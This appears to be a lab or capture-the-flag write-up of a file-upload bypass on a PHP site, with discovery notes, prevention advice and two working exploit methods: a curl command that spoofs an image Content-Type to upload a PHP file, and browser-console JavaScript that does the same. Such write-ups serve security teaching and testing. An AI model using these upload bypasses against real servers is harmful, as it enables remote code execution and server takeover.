# File Upload Bypass Vulnerability

## Overview
The upload feature at `/index.php?page=upload` allows attackers to upload PHP files by tricking the application to accept non-image files.

---

## Discovery

1. Upload form only allows `.jpg` and `.jpeg` files.
2. JavaScript blocks empty uploads, but not actual file content.
3. The app checks file extensions but not the real content.

---

## Exploitation

### **Method 1: cURL Content-Type Spoofing**

```bash
echo '<?php echo "hello"; ?>' > test.php

curl http://<IP_ADDRESS>/index.php?page=upload \
  -F "Upload=Upload" \
  -F "uploaded=@test.php;type=image/jpeg" \
  -F "MAX_FILE_SIZE=100000"
```
- The PHP file is uploaded as if itâ€™s a JPEG by spoofing the content-type.

---

### **Method 2: JavaScript in Browser Console**

1. Open the upload page.
2. Run this in the Console:

   ```javascript
   async function bypassUpload() {
     const uploadUrl = window.location.origin + "/index.php?page=upload";
     const phpCode = "<?php echo 'Bypassed!'; ?>";
     const formData = new FormData();
     const fileBlob = new Blob([phpCode], { type: "image/jpeg" });
     formData.append("uploaded", fileBlob, "image.php");
     formData.append("Upload", "Upload");
     const response = await fetch(uploadUrl, { method: "POST", body: formData });
     const html = await response.text();
     console.log(html);
   }
   bypassUpload();
   ```

## Security Impact

- **Remote Code Execution:** Upload and run PHP code on the server
- **Data Theft:** Access sensitive files and data
- **System Compromise:** Full server takeover possible

---

## Prevention

1. **Validate actual file content, not just extensions**
2. **Use libraries (like fileinfo) for file type checks**
3. **Re-encode images on the server**
4. **Store uploads in non-executable locations**
5. **Apply a strict Content Security Policy**
